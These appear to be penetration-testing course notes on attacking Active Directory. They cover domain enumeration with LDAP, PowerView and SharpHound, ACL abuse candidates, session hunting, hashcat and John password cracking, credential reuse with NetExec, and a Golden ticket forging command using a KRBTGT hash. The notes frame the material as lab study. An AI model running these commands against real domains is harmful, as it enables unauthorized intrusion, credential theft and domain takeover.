Execute and choose variants
text: id="6-execute-and-choose-variants-17">6.3.11.22.6 Execute and choose variants Golden tickets require the domain SID and KRBTGT key. They are persistence/impact concepts, not a default Block 11 action. A forged ticket still depends on correct cryptographic material, realm, time and authorization. For the active service-scoped case, use Silver tickets . Authorized isolated-lab examples: # Golden: realm-wide TGT material impacket-ticketer -nthash KRBTGT_NT_HASH -domain-sid DOMAIN_SID \ -domain DOMAIN AUTHORIZED_TEST_USER export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache" klist Use only against the approved service/host, record ticket metadata and remove generated credentials afterward. Domain recovery after KRBTGT exposure generally requires coordinated credential rotation and replication convergence; service-ticket exposure requires rotating the affected service/machine secret and reviewing access. <h3

title: 6.2.9.1.1 Resolve domain, DC, DNS and clock first
text: id="resolve-domain-dc-dns-and-clock-first">6.2.9.1.1 Resolve domain, DC, DNS and clock first Use the current domain identity or the supported query context; wrong naming/transport can look like a bad password. whoami /all whoami /upn nltest /dsgetdc:DOMAIN w32tm /query /status If Domain/DC preflight works: Enumerate users/groups/ SPNs and collect supported directory relationships. → Enumerate directory objects with native, LDAP and PowerView approaches . Otherwise: KDC timeout, name failure or skew: repair that dependency before judging credentials. → Establish domain identity, DC, DNS, time and route . <h3

title: 6.2.9.1.2 Collect a BloodHound directory baseline with SharpHound
text: id="collect-a-bloodhound-directory-baseline-with-sharphound">6.2.9.1.2 Collect a BloodHound directory baseline with SharpHound Use a collector compatible with the BloodHound version. DCOnly is a directory baseline, not proof of all host/session edges. .\SharpHound.exe --CollectionMethods DCOnly --OutputDirectory .\bh --ZipFileName domain-dconly.zip If A useful object-control edge: Resolve the controlled trustee, target object and effective ACE . → Validate effective directory-object control . If A host/session edge: Check destination rights and session freshness independently. → Validate host access and volatile session candidates . If An account with an SPN: Check the actual account/SPN and ticket-request conditions. → Identify service accounts and SPNs worth investigating . Otherwise: Collection is blocked or incomplete: query the relevant objects manually. → Enumerate directory objects with native, LDAP and PowerView approaches . <h2

title: 6.2.9.2 Discovery workflow
text: id="discovery-workflow">6.2.9.2 Discovery workflow Start with a known domain identity or a directory query context; useful group, object-right and session edges are not assumed. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. Resolve identity, realm, DC, DNS, clock and route first: Establish domain identity, DC, DNS, time and route . Enumerate objects, group nesting and relevant shares with a supported client: Enumerate directory objects with native, LDAP and PowerView approaches ; Read domain shares, SYSVOL and NETLOGON for useful artifacts . Associate SPNs and effective ACEs with actual accounts and object types: Identify service accounts and SPNs worth investigating ; Validate effective directory-object control . Check host-specific rights and session freshness, then validate graph paths edge by edge: Validate host access and volatile session candidates ; Collect focused BloodHound data and validate an attack path . PowerView examples require a reviewed compatible script in the current authenticated directory context. Check the loaded copy rather than mixing legacy/fork parameter names; the directory-mapping entry includes native, ADSI and LDAP alternatives. Import-Module .\PowerView.ps1 Get-Command -Module PowerView Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive . <h2

Discovery action — reference example: Execution context, effects and stopping rule Host/access: A known domain identity or a directory endpoint that permits the selected anonymous query Requires: Correct realm/domain and account qualification; reachable DC/services, usable DNS and acceptable clock skew Action class: Directory reads and selected host/session collection; collection causes network activity. Stop/verify: Record represented identity, realm, selected DC, resolver, clock and real source route. Failure/next check: Wrong domain, KDC timeout, clock skew and account denial are distinct failures. Do not repeatedly change passwords to fix a route problem. whoami /all whoami /upn nltest /dsgetdc:DOMAIN w32tm /query /status Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Outcome after checking Example and next decision Enabled after validation A normal bind/ticket request works in the intended realm: continue domain mapping. title: 6.2.9.5.5 Why it works
text: id="5-why-it-works">6.2.9.5.5 Why it works Local process identity, network credential context and domain naming are separate. Kerberos depends on service names, time and KDC connectivity in addition to a valid password. <h3

title: 6.2.9.5.6 Execute and choose variants
text: id="6-execute-and-choose-variants">6.2.9.5.6 Execute and choose variants <h5

title: 6.2.9.5.6.1.1 Domain-joined Windows source
text: id="domain-joined-windows-source">6.2.9.5.6.1.1 Domain-joined Windows source whoami /all echo %USERDNSDOMAIN% echo %USERDOMAIN% echo %LOGONSERVER% nltest /dsgetdc:DOMAIN nltest /dclist:DOMAIN w32tm /query /status [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() Resolve-DnsName -Type SRV _ldap._tcp.dc._msdcs.DOMAIN Resolve-DnsName -Type SRV _kerberos._tcp.DOMAIN Decisive output: domain FQDN, DC FQDN/IP, current user SID /groups, DNS SRV answers and a plausible time source. USERDOMAIN can be a NetBIOS label; prefer the DNS domain for LDAP/Kerberos. <h5

title: 6.2.9.5.6.1.2 Kali/off-domain source
text: id="kalioff-domain-source">6.2.9.5.6.1.2 Kali/off-domain source dig +short SRV _ldap._tcp.dc._msdcs.DOMAIN @DC_IP dig +short SRV _kerberos._tcp.DOMAIN @DC_IP nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD' ldapsearch -x -LLL -H ldap://DC_HOST:389 -s base -b '' \ defaultNamingContext configurationNamingContext rootDomainNamingContext dnsHostName RootDSE is a directory-server metadata object. Reading it can reveal naming contexts even when anonymous subtree searches are denied. Convert corp.example to DC=corp,DC=example ; do not guess the base DN when RootDSE can supply it. <summary

title: 6.2.9.5.6.1.2.1 Remote Windows session and double-hop caveat
text: id="variant-6-2-9-5-6-1-2-1">6.2.9.5.6.1.2.1 Remote Windows session and double-hop caveat whoami /all klist dir \\DC_HOST\SYSVOL A supplied credential may create the remote session without being delegated onward to the DC. If local identity commands work but access to a second host fails, distinguish a WinRM/PowerShell remoting credential-delegation problem from invalid credentials. An interactive RDP session, explicit credentials, /netonly network credentials or an off-domain LDAP client may create a different context; always record which identity is used locally and over the network. IDENTITY MAP: USER/COMPUTER -> DIRECT + NESTED GROUPS -> DIRECTORY RIGHTS HOST MAP: COMPUTER -> OS/ROLE -> LOCAL/REMOTE-ACCESS RIGHTS -> SESSIONS ROUTE MAP: SOURCE -> DNS/KDC/DC/HOST -> REQUIRED PORT/SERVICE LEAD MAP: EVIDENCE -> HYPOTHESIS -> MINIMUM VALIDATION -> NEXT BLOCK Authentication, authorization, reachability and session presence are independent. A valid LDAP bind does not prove share access; SMB administration on one host does not prove directory privilege; a session edge does not prove retrievable credentials. AS-REQ/AS-REP: user proves knowledge of long-term key -> receives TGT TGS-REQ/TGS-REP: TGT requests SERVICE/HOST -> receives service ticket AP-REQ: client presents service ticket -> service authenticates client AUTHORIZATION: target service still evaluates the represented identity/claims Before changing credentials or tools: getent hosts DC_HOST nc -nvz DC_IP 88 date -u w32tm /query /status klist Record domain FQDN/realm, DC FQDN/IP, source DNS, current time, KDC route and exact target SPN. IP connectivity does not replace hostname/SPN correctness. <h3

Discovery action — reference example: Execution context, effects and stopping rule Host/access: A known domain identity or a directory endpoint that permits the selected anonymous query Requires: Correct search base and authentication transport; object/attribute visibility and compatible local utilities Action class: Directory reads and selected host/session collection; collection causes network activity. Stop/verify: Retain object identifiers, group relationships and actual visibility; distinguish directory facts from inferred execution access. Failure/next check: Missing RSAT/PowerView does not block built-in ADSI or LDAP. Signing/TLS policy requires a compatible authenticated transport. net user USER /domain net group "GROUP" /domain Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Account: USER Global group memberships: GROUP Group members: CONTROLLED_USER Recognize this detail: Account/group membership supplies a relationship to investigate; nested membership and effective destination rights remain separate. Still missing before method selection: Verify object SID/type, nesting and the exact right granted to that principal. Outcome after checking Example and next decision Enabled after validation The membership resolves to a currently effective object/service right: follow that route. Ruled out in this context The same-named group belongs to another domain or grants no intended right: reject the assumed relationship. Inconclusive Partial visibility or nesting not yet expanded leaves effective membership unresolved. title: 6.2.9.6.6.1 RSAT ActiveDirectory module, only when installed
text: id="variant-6-2-9-6-6-1">6.2.9.6.6.1 RSAT ActiveDirectory module, only when installed Get-Command -Module ActiveDirectory Get-ADDomain Get-ADForest Get-ADDomainController -Filter * Get-ADUser -Filter * -Properties Enabled,Description,MemberOf,ServicePrincipalName,UserPrincipalName,PasswordLastSet,LastLogonDate,AdminCount Get-ADGroup -Filter * -Properties GroupScope,GroupCategory,Members,Description Get-ADGroupMember -Identity 'GROUP' -Recursive Get-ADComputer -Filter * -Properties DNSHostName,OperatingSystem,OperatingSystemVersion,ServicePrincipalName,TrustedForDelegation,LastLogonDate Get-ADTrust -Filter * Get-AD* cmdlets require the RSAT ActiveDirectory module. Its absence on a client is normal; use ADSI, LDAP, PowerView or an off-domain client. $root = [ADSI]'LDAP://RootDSE' $base = [ADSI]("LDAP://" + $root.defaultNamingContext) $searcher = New-Object System.DirectoryServices.DirectorySearcher($base) $searcher.PageSize = 1000 $searcher.PropertiesToLoad.AddRange(@('samaccountname','userprincipalname','objectsid','memberof','serviceprincipalname','description','useraccountcontrol','pwdlastset','lastlogontimestamp')) $searcher.Filter = '(&(objectCategory=person)(objectClass=user))' $searcher.FindAll() | ForEach-Object { $_.Properties } Change only the filter and requested attributes for another object class: <h4

title: 6.2.9.6.6.2 Groups
text: id="variant-6-2-9-6-6-2">6.2.9.6.6.2 Groups # Groups $searcher.Filter = '(objectCategory=group)' $searcher.PropertiesToLoad.Clear() $searcher.PropertiesToLoad.AddRange(@('samaccountname','objectsid','member','grouptype','description')) $searcher.FindAll() | ForEach-Object { $_.Properties } <h4

title: 6.2.9.6.6.3 Computers
text: id="variant-6-2-9-6-6-3">6.2.9.6.6.3 Computers # Computers $searcher.Filter = '(objectCategory=computer)' $searcher.PropertiesToLoad.Clear() $searcher.PropertiesToLoad.AddRange(@('dnshostname','operatingsystem','operatingsystemversion','serviceprincipalname','useraccountcontrol','lastlogontimestamp')) $searcher.FindAll() | ForEach-Object { $_.Properties } PageSize = 1000 asks for paged results; without paging, the server's result-size limit can silently produce an incomplete inventory. LDAP filters are data selection, not proof of access or exploitability. <h5

text: id="users-groups-and-computers">6.2.9.6.6.3.2 Users, groups and computers ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(&(objectCategory=person)(objectClass=user))' \ sAMAccountName userPrincipalName objectSid userAccountControl memberOf description servicePrincipalName pwdLastSet lastLogonTimestamp adminCount ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(objectCategory=group)' sAMAccountName objectSid member groupType description ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(objectCategory=computer)' dNSHostName operatingSystem operatingSystemVersion servicePrincipalName userAccountControl lastLogonTimestamp <summary

title: 6.2.9.6.6.3.2.1 SPNs, trusts and GPO/OU context
text: id="variant-6-2-9-6-6-3-2-1">6.2.9.6.6.3.2.1 SPNs, trusts and GPO/OU context # SPN-bearing accounts: mapping only; do not request tickets in this block. ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' \ sAMAccountName servicePrincipalName memberOf userAccountControl pwdLastSet # Trusted-domain objects ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -b 'DC=DOMAIN,DC=TLD' '(objectClass=trustedDomain)' \ cn securityIdentifier trustDirection trustType trustAttributes # OUs and GPO containers; correlate links before inferring host effect. ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(|(objectClass=organizationalUnit)(objectClass=groupPolicyContainer))' \ distinguishedName displayName name gPLink gPOptions <h5

title: 6.2.9.6.6.3.3 LDAP failure router
text: id="ldap-failure-router">6.2.9.6.6.3.3 LDAP failure router Result Interpretation Next action Invalid credentials (49) Bind identity/secret/context failed; subcodes may refine the cause Recheck UPN vs DOMAIN\USER , account state and exact secret; do not infer authorization Strong(er) authentication required / confidentiality required Server policy rejects that bind/transport Use the permitted LDAPS/StartTLS or Kerberos/SASL path; do not disable protections Size limit exceeded or suspiciously round count Search is incomplete Add paged results and narrow the base/filter Referral/partial results Search crossed a naming-context boundary Query the referred domain/partition or compatible Global Catalog deliberately Bind succeeds, search empty Wrong base/filter, ACL filtering or genuinely no matches Verify RootDSE base, test a known object and request fewer attributes Works by IP, Kerberos fails Route exists but name/SPN/DNS/time path is wrong Use DC FQDN, AD DNS, correct realm and synchronized time Import-Module .\PowerView.ps1 Get-Command -Module PowerView Get-Domain Get-DomainController Get-DomainTrust Get-DomainUser | Select-Object samaccountname,userprincipalname,description,memberof,serviceprincipalname Get-DomainGroup Get-DomainGroupMember -Identity 'GROUP' -Recurse Get-DomainComputer | Select-Object dnshostname,operatingsystem,operatingsystemversion Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof The original PowerSploit repository is archived. Course examples and forks may use legacy aliases such as Get-NetUser , Get-NetGroup , Get-NetComputer or Get-NetDomainTrust . Inspect Get-Command / Get-Help for the exact copy present rather than mixing generations. NEW PASSWORD/HASH/KEY/TICKET -> VERIFY TYPE, CLIENT, REALM, VALIDITY -> AUTHENTICATE THROUGH ONE COMPATIBLE SERVICE -> CONFIRM IDENTITY -> REPEAT GROUP/ACL/SHARE/HOST/SESSION/ROUTE MAPPING Do not overwrite the old state. Record which source produced the material and which protocol accepted it. <h3

Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight|WriteProperty|Self' } | Select-Object ObjectDN,IdentityReference,ActiveDirectoryRights,ObjectAceType,AceType,IsInherited,InheritanceType If the value is an unresolved SID, resolve it before applying the rule to a controlled principal. Candidate right Possible transition to validate later Missing proof now GenericAll Broad object modification Controlled trustee, target object class, applicable deny/inheritance and useful change GenericWrite / WriteProperty Change one or more writable attributes Exact attribute/object GUID and a transition that consumes it WriteOwner Become owner Ability to change the DACL afterward and use the resulting right WriteDacl Add an ACE Effective write-DACL right, planned narrow ACE and restoration AllExtendedRights / ForceChangePassword Extended operation such as reset where applicable Object class, exact extended right and downstream usefulness Self / validated write Add self/member or another validated attribute where schema permits Correct validated-write GUID and target type GPO/OU control Affect linked computers/users Writable GPO component, effective link/scope, refresh/trigger and target placement An ACE is one rule. Effective access depends on trustee/group nesting, allow/deny semantics, inheritance, object-specific GUIDs and security descriptor scope. Do not perform the modification in this mapping block. Model: controlled principal → effective ACE → target object/type → permitted modification → authentication/authorization effect → cleanup. Enumerate a target's ACL with resolved GUIDs: Import-Module .\PowerView.ps1 Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight' } Resolve trustees: ConvertFrom-SID 'S-1-5-21-...' Get-DomainObject -Identity 'S-1-5-21-...' | Select-Object samaccountname,objectclass Common effects require different rights: Right/object Possible controlled effect Validation needed GenericAll /password-reset extended right on user Reset the user's password Effective trustee, account state, protected-object behavior GenericAll or effective member-attribute write on group Add a controlled principal to the group Target group, nesting and a refreshed logon token GenericWrite /SPN-property write on user Add a temporary SPN, request a TGS and remove it Exact property right, duplicate-SPN checks and cleanup WriteDacl Grant a narrower right Ability to write DACL and restore original ACL WriteOwner Change owner, then possibly DACL Owner semantics and cleanup Computer-object write RBCD-related attribute change Machine account/control, SPN/Kerberos and target service <h3

text: id="5-why-it-works-5">6.2.9.10.5 Why it works Local admin, RDP, WinRM and share-read relationships grant different capabilities. A historical session does not guarantee current credential material or the right to read it. <h3

title: 6.2.9.10.6 Execute and choose variants
text: id="6-execute-and-choose-variants-5">6.2.9.10.6 Execute and choose variants Find-LocalAdminAccess nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares Find-LocalAdminAccess is a broad candidate generator and can be noisy or blocked by firewall/RPC controls. Validate a selected host with the service you may actually use. NetExec's (Pwn3d!) indicates administrative SMB context according to that tool; it does not establish RDP, WinRM, WMI/DCOM or directory rights. RDP, WinRM, SMB/service control and WMI/DCOM each have different ports, services, policies and authorization. Get-NetSession -ComputerName COMPUTER -Verbose Get-NetLoggedon -ComputerName COMPUTER PsLoggedOn.exe \\COMPUTER Get-NetSession relies on workstation/session enumeration APIs that modern Windows may restrict. PsLoggedOn combines Registry profile evidence with NetSessionEnum ; remote Registry access and sufficient rights are relevant, and querying can itself create a network-session entry. Therefore: empty/denied is inconclusive , not proof of no users; a session is a time-sensitive observation, not a durable ACL; a session matters only if the current identity can reach/control that host and a later credential/ticket technique applies; session presence does not prove credentials are resident, accessible or reusable. <h3

text: id="current-sharphound-ce">6.2.9.11.6.1.1 Current SharpHound CE Low-noise directory baseline that avoids contacting every workstation: .\SharpHound.exe --CollectionMethods DCOnly --OutputDirectory .\bh --ZipFileName domain-dconly.zip Add host facts only when they can answer the next question: .\SharpHound.exe --CollectionMethods LocalGroup --ComputerFile .\candidate-hosts.txt --OutputDirectory .\bh --ZipFileName candidate-localgroups.zip .\SharpHound.exe --CollectionMethods Session --ComputerFile .\candidate-hosts.txt --Loop --LoopDuration 00:10:00 --OutputDirectory .\bh --ZipFileName candidate-sessions.zip SharpHound with no collection flag uses its broader default, including directory data plus local-group/session attempts. All performs every supported method; it is not the first response to an unanswered narrow question. Import the output ZIP into a compatible BloodHound CE deployment and verify node/edge counts and ingestion errors. <summary

title: 6.2.9.11.6.1.1.1 Collector variants and compatibility
text: id="variant-6-2-9-11-6-1-1-1">6.2.9.11.6.1.1.1 Collector variants and compatibility # Inspect the actual collector before using copied syntax. .\SharpHound.exe --help # Community Linux collector; flags and output compatibility vary by release. bloodhound-python --help bloodhound-python -u USER -p 'PASSWORD' -d DOMAIN -ns DC_IP -dc DC_HOST -c All --zip # Legacy/course PowerShell collector; use only with a compatible legacy deployment. Import-Module .\SharpHound.ps1 Invoke-BloodHound -CollectionMethod All -OutputDirectory .\bh -ZipFileName legacy.zip Use the collector version intended for the BloodHound deployment. bloodhound-python , legacy SharpHound PowerShell and current SharpHound CE are alternatives with different schemas/features, not interchangeable command spellings. <h5

title: 6.2.9.11.6.1.2 Analyze in this order
text: id="analyze-in-this-order">6.2.9.11.6.1.2 Analyze in this order Mark only identities/hosts actually controlled. A low-privilege session on a host does not make the host itself fully owned. Inspect the controlled principal's direct and nested group memberships and outbound object-control edges. Inspect reachable computers where it has local admin, RDP, WinRM/DCOM or other applicable rights. Inspect high-value goals and shortest paths only as hypothesis generation. Classify each selected edge: directory/static-ish: group, ACL, GPO, OU, trust; host-derived: local group or user right; volatile: session; route-dependent: the required host/service must be reachable now. Reproduce the minimum important relationship manually before handing it to Block 11 or 12. ID | CONTROLLED PRINCIPAL | RELATIONSHIP | TARGET | SOURCE EVIDENCE | EFFECTIVE? | ROUTE/SERVICE | VOLATILITY | EXPECTED TRANSITION | MINIMUM VALIDATION | STATUS | NEXT BLOCK Rank candidates by: confidence that the relationship is effective; deterministic value of the resulting identity/access; route and service availability; stability versus volatile session timing; reversibility and impact; number of unsupported assumptions. Prefer a validated readable share/credential clue or direct object right over a multi-edge path built from stale sessions and unreachable hosts. <h3

title: 3.1 Recover and use authentication material
text: id="recover-and-use-authentication-material">3.1 Recover and use authentication material Strategy map | Master Notes | Operational index | Cheatsheets Treat passwords, keys, stored verifiers, challenge responses and tickets as different capabilities. Recovering a password, authenticating and obtaining useful authorization are separate transitions. Speedrun blocks: 5; recurring identity thread. Documented methods: 10. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. <h2

title: 3.1.1 First pass: tools and findings
text: id="first-pass-tools-and-findings">3.1.1 First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. <h3

title: 3.1.1.1 Identify the artifact before using a cracking tool
text: id="identify-the-artifact-before-using-a-cracking-tool">3.1.1.1 Identify the artifact before using a cracking tool Keep provenance and local/domain/application account scope. Hash-looking text is not automatically an NT hash. file FILE head -c 160 FILE If A plaintext password: Test the matching identity on one relevant reachable service. → Validate known passwords and context-specific reuse . If An SSH private key: Check key format, protection and the intended account. → Inspect and recover SSH private-key access . If A ticket/cache: Check principal, service scope, expiry and a compatible client. → Classify tickets and use a compatible cache . Otherwise: Format is still unknown: inspect the artifact before selecting a Hashcat/John mode. → Classify the artifact and its identity context . <h3

title: 3.1.1.2 Use Hashcat/John only after format identification
text: id="use-hashcatjohn-only-after-format-identification">3.1.1.2 Use Hashcat/John only after format identification Select the documented format-specific mode and an offline candidate list; recovery is not proof of service access. hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job hashcat -m MODE hashes.txt --show If A password is recovered: Validate the account scope and relevant service permission. → Validate known passwords and context-specific reuse . If A reusable NT hash rather than a recoverable plaintext password: Use only protocols and clients supporting that material. → Recover or reuse an NT password hash . Otherwise: No recovery: revisit artifact type and feasible candidates; enumerate other evidence instead of assuming the account is unusable. → Classify the artifact and its identity context . <h2

title: 3.1.2 Discovery workflow
text: id="discovery-workflow">3.1.2 Discovery workflow Start with an artifact produced by an actual read, query, session or collection source; the artifact type and username may still be unknown. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. Record source and account scope, then inspect the artifact's structure: Classify the artifact and its identity context . Separate an immediately usable password/key from material needing recovery: Validate known passwords and context-specific reuse ; Inspect and recover SSH private-key access ; Recover passwords with feasible dictionary, rule and mask attacks . Use type-specific handling for stored verifiers, captured responses and tickets: Recover or reuse an NT password hash ; Recover a password from a captured NTLM response ; Recover a password from cached domain logon verifiers ; Classify tickets and use a compatible cache . After acceptance, test the specific service right and return to authenticated enumeration: Match route, destination service and effective authorization ; Enumerate SMB/RPC shares, files and identities . Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive . <h2

title: 3.1.3 Method families
text: id="method-families">3.1.3 Method families Classification and online use: Classify the artifact and its identity context , Validate known passwords and context-specific reuse . Offline recovery and protected files: Recover passwords with feasible dictionary, rule and mask attacks , Recover a protected KeePass database password , Inspect and recover SSH private-key access , Recover Linux account passwords from matched records . Typed Windows/domain material: Recover or reuse an NT password hash , Recover a password from a captured NTLM response , Recover a password from cached domain logon verifiers , Classify tickets and use a compatible cache . <h2

text: id="choose-a-method">3.1.4 Choose a method Method Recognition clue Required access Enabling conditions Resulting capability Classify the artifact and its identity context A secret-like value, key file, stored hash, challenge response or ticket A credential artifact with a recorded source and possible account context Artifact provenance and format; title: 3.1.5.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access">3.1.5.2.1 Find the clue from your starting access Where to investigate: Return to the file, database row, capture or session that produced the artifact; inspect structure and account labels before choosing a tool mode. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A credential artifact with a recorded source and possible account context Requires: Artifact provenance and format; possible local/domain/application identity and compatible protocol Action class: Credential processing and selected authentication; online guessing can affect lockout state. Stop/verify: Identify artifact type, source, account/domain and compatible next operation; record unknowns instead of guessing. Failure/next check: A 32-character hexadecimal value is not enough to identify its algorithm. Use application/source evidence and converters. file FILE head -c 160 FILE Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Possible structures: -----BEGIN OPENSSH PRIVATE KEY----- USER::DOMAIN:CHALLENGE:RESPONSE:BLOB USER:RID:LM_HASH:NT_HASH::: Recognize this detail: Headers and producing context distinguish a private key, challenge response and stored NT verifier. Still missing before method selection: Record the exact source, user/domain and complete format; identify compatible recovery/authentication operations. Outcome after checking Example and next decision Enabled after validation Source and format agree on the type: route it to the matching recovery/use method. Ruled out in this context The value is an application identifier rather than an authentication artifact: reject the credential hypothesis. Inconclusive A bare hexadecimal string without provenance does not identify its algorithm; investigate the producing application. If you do not yet have this clue: start with Inspect source, backups, configuration and repository artifacts . <h3

title: 3.1.5.6 Execute and choose variants
text: id="6-execute-and-choose-variants">3.1.5.6 Execute and choose variants SOURCE -> MATERIAL/FORMAT -> LOCAL/DOMAIN/APPLICATION IDENTITY -> POSSIBLE USE -> SERVICE/PROTOCOL -> AUTHENTICATION -> AUTHORIZATION -> NEW ACCESS -> RE-ENUMERATION Record source, claimed identity, format evidence, possible uses, tested service, result and resulting rights together. Material Recognition Compatible use Cleartext password Text tied to an identity/source Normal protocol/application login SSH private key OpenSSH/PEM private-key block SSH public-key authentication; recover passphrase offline if protected Linux password record USER:$id$salt$digest:... Offline recovery with complete record/format Application/file verifier Tool-specific $...$ or documented digest Offline recovery with matching mode/parser NT hash Usually 32 hex from SAM/LSASS/NTDS context Offline recovery; PtH where NTLM and the client support it Net-NTLMv2 response USER::DOMAIN:challenge:proof:blob Offline recovery or live relay under specific conditions; not PtH material DCC2/MSCache v2 Username-dependent cached-domain verifier Offline recovery; not ordinary PtH material Kerberos ticket .kirbi , ccache or in-memory cache Ticket-specific access subject to realm, SPN , validity, clock and route Kerberos roast material $krb5asrep$... or $krb5tgs$... Offline recovery with matching enctype/mode Session/API token Cookie, bearer/JWT or application token Issuing application and authorization context only Do not feed unknown strings into random modes. Preserve the source and identity context, then identify the format: hashid HASH_OR_FILE john --list=formats | grep -i KEYWORD hashcat -hh | grep -i KEYWORD hashcat --example-hashes | less Failure cue: No hashes loaded , token/line-length errors or zero parsed hashes normally indicate wrong format, mode, damaged input or unsupported version—not a strong password. Output Type Immediate compatible possibilities Not valid as Cleartext password Reusable secret Password authentication, key derivation, DPAPI where applicable Proof of authorization NT hash NTLM key Offline crack; PTH where NTLM/service policy allows; Kerberos RC4 transition where supported Net-NTLM response or DCC2 AES128/AES256 key Kerberos long-term key Request Kerberos material using compatible tooling Direct NTLM authentication .kirbi / ccache Kerberos ticket container Use while valid for its client/realm/SPN scope Password/hash DCC2/MSCache v2 Offline verifier Offline cracking PTH DPAPI key/blob Protected-data material Decrypt only with matching context/keys General logon credential Machine-account key Computer identity Map the computer account's rights and Kerberos/NTLM paths Human/domain-admin identity Every newly usable identity returns to Block 10 before movement: VERIFY MATERIAL -> AUTHENTICATE SAFELY -> CONFIRM IDENTITY -> MAP GROUPS/RIGHTS/SHARES/HOSTS/ROUTES <h3

title: 3.1.6.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-1">3.1.6.2.1 Find the clue from your starting access Where to investigate: Use the account label from the producing source and the observed service inventory to choose one compatible, correctly qualified validation. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A credential artifact with a recorded source and possible account context Requires: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state Action class: Credential processing and selected authentication; online guessing can affect lockout state. Stop/verify: Record exact identity, service and tested read/write/session effect; classify authentication and authorization separately. Failure/next check: Account disabled, expired password, wrong domain and denied logon require different responses. Avoid repeating a known-valid password against a denied action. nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. SMB TARGET [+] DOMAIN\USER: accepted Administrative execution: not yet demonstrated Recognize this detail: Accepted authentication proves one service/account pairing; it does not establish shares, administration, RDP or WinRM. Still missing before method selection: Qualify local/domain/application identity explicitly, test a compatible reachable service and record the accepted identity. Then test the specific share/logon/execution right; successful authentication is not administrative authorization. Outcome after checking Example and next decision Enabled after validation The intended service operation succeeds under the recorded identity: use that access and re-enumerate. Ruled out in this context The secret is valid only for the application and not the proposed OS account: reject that reuse pairing. Inconclusive A generic logon failure may hide account/domain/state mismatch; classify it before repeating attempts. If you do not yet have this clue: start with Classify the artifact and its identity context . <h3
